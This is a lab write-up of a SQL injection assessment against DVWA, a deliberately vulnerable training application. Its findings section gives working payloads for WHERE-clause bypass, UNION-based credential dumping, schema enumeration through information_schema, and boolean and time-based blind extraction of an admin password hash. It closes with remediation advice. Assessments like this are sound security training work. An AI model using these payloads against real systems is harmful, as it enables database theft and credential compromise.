
## Assessments
- [SQL Injection](./DVWA_SQLi_Writeup.md)
- [XSS (Reflected, Stored, DOM)](./DVWA_XSS_Writeup.md)
- [CSRF](./DVWA_CSRF_Writeup.md)

# DVWA Security Assessment — SQL Injection

**Tester:** Devansh
**Target:** DVWA (Damn Vulnerable Web Application)
**Security Level:** Low
**Date:** Day 2 — July 2026

---

## 1. Summary

The SQL Injection module in DVWA (Low security) is vulnerable to classic SQL injection due to unsanitized user input being directly concatenated into a SQL query. This allowed authentication logic bypass, full table dumps via UNION-based injection, complete database schema enumeration via `information_schema`, and data extraction via both boolean-based and time-based blind techniques — without ever having prior knowledge of table or column names.

---

## 2. Vulnerable Code

**File:** `vulnerabilities/sqli/source/low.php`

```php
$id = $_REQUEST[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

**Root cause:** User input (`$id`) is directly concatenated into the SQL query string with no sanitization, escaping, or parameterization. The database cannot distinguish between the intended query structure and attacker-supplied input.

---

## 3. Findings

### 3.1 Authentication / WHERE Clause Bypass

**Payload:**
```
1' OR '1'='1
```

**Resulting query:**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

**Result:** Returned all 6 user records instead of one, since `'1'='1'` is always true, making the WHERE clause match every row.

---

### 3.2 UNION-Based Data Extraction

**Payload:**
```
1' UNION SELECT user, password FROM users #
```

**Result:** Extracted all usernames and password hashes (MD5) from the `users` table by aligning the injected SELECT's column count (2) with the original query.

Example extracted hash: `5f4dcc3b5aa765d61d8327deb882cf99` (known MD5 of "password" — weak, unsalted hashing).

**Note:** `#` used as end-of-line comment to neutralize the trailing query syntax (MySQL requires a trailing space after `--`, so `#` is more reliable in form-submitted payloads).

---

### 3.3 Schema Enumeration (Zero Prior Knowledge)

**Step 1 — Identify current database:**
```
1' UNION SELECT database(), user() #
```
Result: `dvwa` / `app@localhost`

**Step 2 — Enumerate tables:**
```
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database() #
```
Result: `guestbook`, `users`

**Step 3 — Enumerate columns of `users`:**
```
1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' #
```
Result:
| Column | Type |
|---|---|
| user_id | int |
| first_name | varchar |
| last_name | varchar |
| user | varchar |
| password | varchar |
| avatar | varchar |
| last_login | timestamp |
| failed_login | int |

**Significance:** Demonstrates that an attacker does not need any prior knowledge of the database structure — the entire schema can be reconstructed purely through injection.

---

### 3.4 Boolean-Based Blind SQL Injection

Used on the "SQL Injection (Blind)" module, where raw data is not displayed — only a generic "exists" / "missing" message is shown.

**True condition:**
```
1' AND '1'='1
```
→ "User ID exists in the database."

**False condition:**
```
1' AND '1'='2
```
→ "User ID is MISSING from the database."

**Data extraction via oracle:**
```
1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5
```
→ TRUE ("exists"), confirming the first character of admin's password hash is `5`.

**Technique:** By iterating this substring check across all 32 hex positions of the hash, the entire hash can be reconstructed character-by-character using only a binary exists/missing signal.

---

### 3.5 Time-Based Blind SQL Injection

Used when there is no visible response difference at all — only response *timing* reveals the result.

**Payload:**
```
1' AND IF(1=1, SLEEP(5), 0) #
```
→ Response delayed ~5 seconds (condition TRUE).

```
1' AND IF(1=2, SLEEP(5), 0) #
```
→ Immediate response (condition FALSE).

**Data extraction pattern:**
```
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE user='admin')='5', SLEEP(5), 0) #
```
A 5-second delay confirms the character; an immediate response rules it out. This is the technique automated by tools like `sqlmap`.

---

## 4. Impact

- Full authentication bypass
- Complete dump of user credentials (hashes)
- Full database schema disclosure without prior knowledge
- Data exfiltration possible even with zero visible output (time-based)

---

## 5. Remediation

1. **Use parameterized queries / prepared statements** instead of string concatenation:
   ```php
   $stmt = mysqli_prepare($conn, "SELECT first_name, last_name FROM users WHERE user_id = ?");
   mysqli_stmt_bind_param($stmt, "s", $id);
   ```
2. **Least-privilege DB accounts** — the app's DB user should not have access to `information_schema` or other databases beyond what's required.
3. **Strong password hashing** — replace unsalted MD5 with bcrypt/Argon2.
4. **Input validation** — enforce expected type/format (e.g., numeric-only `user_id`) at the application layer as defense-in-depth.
5. **WAF / query monitoring** as an additional layer, not a substitute for fixing the root cause.

---

